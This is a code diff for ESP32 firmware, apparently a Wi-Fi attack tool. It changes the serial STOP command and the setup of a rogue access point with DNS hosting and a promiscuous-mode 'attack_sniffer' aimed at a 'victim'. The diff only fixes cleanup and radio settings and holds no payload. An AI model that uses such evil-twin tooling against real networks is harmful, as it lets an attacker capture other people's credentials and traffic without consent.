@@ -261,8 +261,14 @@ void serial_cmd_handle()
         if (cmdInput == "STOP")
         {
             attack_running = false;
-            if (!hosting_running)
-                esp_wifi_set_promiscuous(false);
+            if (hosting_running) {
+                server.end();
+                dnsServer.stop();
+                WiFi.softAPdisconnect(true);
+                hosting_running = false;
+            }
+            esp_wifi_set_promiscuous(false);
+            WiFi.mode(WIFI_OFF);
             Serial.println("[SUCCESS] ALL_STOPPED");
             return;
         }
@@ -338,9 +344,14 @@ void serial_cmd_handle()
                 String chStr = rawInput.substring(s2 + 1);
                 int ch = chStr.toInt();
 
+                // Clean state before hosting
+                esp_wifi_set_promiscuous(false);
+                WiFi.softAPdisconnect(true);
                 WiFi.mode(WIFI_OFF);
-                applyWifiFix();
-                WiFi.mode(WIFI_AP_STA);
+                delay(100);
+                
+                WiFi.mode(WIFI_AP);
+                WiFi.setTxPower(WIFI_POWER_11dBm); // Fix disconnecting issues
                 WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);
                 WiFi.softAP(ssid.c_str(), NULL, ch, 0, 4);
 
@@ -352,6 +363,8 @@ void serial_cmd_handle()
                 hosting_running = true;
                 verification_status = 0;
                 victim_connected = false;
+                
+                // Restart attack sniffer in AP mode
                 esp_wifi_set_promiscuous(true);
                 esp_wifi_set_promiscuous_rx_cb(&attack_sniffer);
 
